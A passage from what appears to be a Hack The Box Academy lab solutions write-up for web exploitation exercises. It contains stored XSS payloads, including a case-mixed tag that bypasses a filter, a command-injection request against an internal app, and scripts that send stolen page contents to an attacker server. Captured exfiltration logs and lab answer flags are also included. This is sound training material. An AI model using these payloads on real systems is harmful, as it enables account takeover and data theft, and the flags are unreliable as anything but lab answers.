Answer: `HTB{5a60fa501e1866626e96115b598d4541}`

# Exploiting internal Web Applications II

## Question 1

### "Exploit the XSS vulnerability to target the internal web application and obtain the flag."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb internal-webapps-2.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-btohwvbizk]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb internal-webapps-2.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site (`https://internal-webapps-2.htb`) using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![[HTB Solutions/CWEE/z. images/3c29f83fde2a1120743a0726ff9da28d_MD5.jpg]]

Once submitted, students need to prepare a payload on the exploit server (`https://exploitserver.htb`), attempting to exploit the command injection vulnerability on the internal site identified in the section's reading. Students need to have the payload execute the command `cat /flag.txt`, and have the output sent to the exfiltration server:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = \`webapp_selector=${encodeURIComponent("| cat /flag.txt")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![[HTB Solutions/CWEE/z. images/48e09994e82e278d32ce014343d712c6_MD5.jpg]]

After saving the payload, students need to create a Python script serving as an HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

Students need to wait a few moments before checking the exfiltration server, containing Base64 encoded data in the response:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-btohwvbizk]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.233.62 - - [28/Jan/2025 05:24:23] code 404, message File not found
10.129.233.62 - - [28/Jan/2025 05:24:23] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgU3RhdHVzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgSFRCezBlYzlhZTNhZWEzYzU5MTIxZmYyZjFiNGU5OWQwZmNhfQoKICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9Im1vZGFsIj4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSIvY2hlY2siIG1ldGhvZD0icG9zdCI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGI+U2VsZWN0IHRoZSBXZWIgQXBwbGljYXRpb248L2I+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIGlkPSJtYWluIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2ludGVybmFsLXdlYmFwcHMtMi5odGIiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ibWFpbiI+aW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iaW50ZXJuYWwiIG5hbWU9IndlYmFwcF9zZWxlY3RvciIgdmFsdWU9Imh0dHBzOi8vaW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YiI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnRlcm5hbCI+aW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iYXBpIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2FwaS5pbnRlcm5hbC13ZWJhcHBzLTIuaHRiIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImFwaSI+YXBpLmludGVybmFsLXdlYmFwcHMtMi5odGI8L2xhYmVsPgoKICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5DaGVjazwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= HTTP/1.1" 404 -
```

Students need to decode the Base64 encoded blob to reveal the flag:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgU3RhdHVzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgSFRCezBlYzlhZTNhZWEzYzU5MTIxZmYyZjFiNGU5OWQwZmNhfQoKICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9Im1vZGFsIj4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSIvY2hlY2siIG1ldGhvZD0icG9zdCI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGI+U2VsZWN0IHRoZSBXZWIgQXBwbGljYXRpb248L2I+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIGlkPSJtYWluIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2ludGVybmFsLXdlYmFwcHMtMi5odGIiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ibWFpbiI+aW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iaW50ZXJuYWwiIG5hbWU9IndlYmFwcF9zZWxlY3RvciIgdmFsdWU9Imh0dHBzOi8vaW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YiI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnRlcm5hbCI+aW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iYXBpIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2FwaS5pbnRlcm5hbC13ZWJhcHBzLTIuaHRiIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImFwaSI+YXBpLmludGVybmFsLXdlYmFwcHMtMi5odGI8L2xhYmVsPgoKICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5DaGVjazwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-btohwvbizk]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgU3RhdHVzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgSFRCezBlYzlhZTNhZWEzYzU5MTIxZmYyZjFiNGU5OWQwZmNhfQoKICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9Im1vZGFsIj4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSIvY2hlY2siIG1ldGhvZD0icG9zdCI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGI+U2VsZWN0IHRoZSBXZWIgQXBwbGljYXRpb248L2I+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIGlkPSJtYWluIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2ludGVybmFsLXdlYmFwcHMtMi5odGIiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ibWFpbiI+aW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iaW50ZXJuYWwiIG5hbWU9IndlYmFwcF9zZWxlY3RvciIgdmFsdWU9Imh0dHBzOi8vaW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YiI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnRlcm5hbCI+aW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iYXBpIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2FwaS5pbnRlcm5hbC13ZWJhcHBzLTIuaHRiIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImFwaSI+YXBpLmludGVybmFsLXdlYmFwcHMtMi5odGI8L2xhYmVsPgoKICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5DaGVjazwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check Status</h2>

    <div class="modal">
        HTB{0ec9ae3aea3c59121ff2f1b4e99d0fca}

    </div>
    
<SNIP>
```

Answer: `HTB{0ec9ae3aea3c59121ff2f1b4e99d0fca}`

# XSS Filter Bypasses

## Question 1

### "Bypass the XSS filter to exploit the XSS vulnerability to exfiltrate data the victim can access and find the flag."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb filterbypass.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-fylklwlctd]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.145.169 exploitserver.htb filterbypass.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site (`https://filterbypass.htb`) using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry. However, this version of the vulnerable site employs XSS filters. Therefore, to bypass the filter, students need to use a mix of lowercase and uppercase letters:

Code: html

```html
<ScRiPt SrC="https://exploitserver.htb/exploit"></ScRiPt>
```

![[HTB Solutions/CWEE/z. images/ae998163b7409e32b3f9156436885037_MD5.jpg]]

After submitting the base XSS payload to the guestbook, students need to navigate to the exploit server. Then, students need to craft a payload to exfiltrate the contents of the `admin.php` endpoint:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://filterbypass.htb/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![[HTB Solutions/CWEE/z. images/cf8ec30ca6194efb08599d34623dcca1_MD5.jpg]]

After saving the payload, students need to create a Python script serving as an HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

Students need to wait a few moments before checking the exfiltration server:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-fylklwlctd]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.145.169 - - [28/Jan/2025 05:36:27] code 404, message File not found
10.129.145.169 - - [28/Jan/2025 05:36:27] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQnsxZTkwNjkwMjFhM2I3M2Y0MWRjMjMwZjNlM2VmNTY4NX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+Cg== HTTP/1.1" 404 -
```

Students need to decode the Base64 encoded response, while using `grep` to locate the flag:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQnsxZTkwNjkwMjFhM2I3M2Y0MWRjMjMwZjNlM2VmNTY4NX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+Cg== | base64 -d | grep HTB
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-fylklwlctd]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQnsxZTkwNjkwMjFhM2I3M2Y0MWRjMjMwZjNlM2VmNTY4NX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz